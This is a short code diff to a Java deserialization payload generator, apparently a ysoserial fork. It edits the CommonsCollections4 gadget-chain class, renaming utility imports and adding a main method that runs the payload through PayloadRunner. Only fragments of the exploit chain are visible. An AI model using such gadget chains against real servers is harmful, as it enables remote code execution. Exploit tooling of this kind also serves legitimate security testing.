@@ -5,6 +5,7 @@ import java.util.Queue;
 
 import javax.xml.transform.Templates;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ChainedTransformer;
@@ -14,8 +15,8 @@ import org.apache.commons.collections4.functors.InstantiateTransformer;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 
@@ -55,5 +56,8 @@ public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
 		args[0] = templates;
 
 		return queue;
+	}
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections4.class, args);
 	}
 }
